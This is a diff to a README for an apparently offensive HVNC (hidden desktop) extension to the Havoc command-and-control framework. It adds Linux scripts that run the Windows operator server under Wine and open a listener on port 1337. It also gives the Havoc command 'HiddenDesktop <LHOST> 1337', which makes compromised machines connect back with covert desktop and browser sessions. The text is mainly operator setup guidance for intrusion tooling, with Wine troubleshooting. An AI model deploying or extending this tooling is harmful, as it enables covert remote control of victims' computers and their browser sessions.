@@ -47,17 +47,35 @@ Artifacts in `bin/`:
 - `HVNC Server.exe` — operator UI (Windows; run under **Wine** on Kali)
 - `explorer.x64.o` `cmd.x64.o` `run.x64.o` `chrome.x64.o` `edge.x64.o` `firefox.x64.o` `generic.x64.o`
 - `hidden-desktop.py` — Havoc Script Manager loader
+- `scripts/hd-server.py` — Linux GUI: probe wine64 / HVNC exe, start listener
+- `scripts/hd-listen.sh` — CLI equivalent
 
 ## Install (Havoc)
 
-1. Start the operator UI on Kali (listen **0.0.0.0:1337**):
+1. Start the operator UI on Linux (Wine **64-bit**, listen **0.0.0.0:1337**).
 
 ```bash
-# GUI on your DISPLAY
-wine "bin/HVNC Server.exe"
+python3 scripts/hd-server.py
 ```
 
-You should see: `[+] Starting HVNC Server on Port: 1337`
+The GUI probes PATH / well-known locations and prints English debug:
+
+- `[+] wine64    /usr/lib/wine/wine64`
+- `[-] missing HVNC Server.exe`
+- `[-] wine64 not found in PATH`
+
+Set **LHOST** to your LAN IP, click **START**. It prints what to type in Havoc:
+
+```text
+HiddenDesktop <LHOST> 1337
+```
+
+CLI: `./scripts/hd-listen.sh`  
+Overrides: `HAVOC_HD_EXE`, `WINE64` / `WINELOADER`, `WINEPREFIX` (default `~/.wine-hvnc`).
+
+Do **not** use Debian `/usr/bin/wine` on this PE32+ binary (wrapper prefers 32-bit → `kernel32.dll` / `c0000135`).
+
+Sanity check without GUI: `python3 scripts/hd-server.py --check`
 
 2. Havoc GUI → **Scripts → Load Script** → `bin/hidden-desktop.py`  
    Havoc `exec()`s the file (**no `__file__`**). The loader searches:
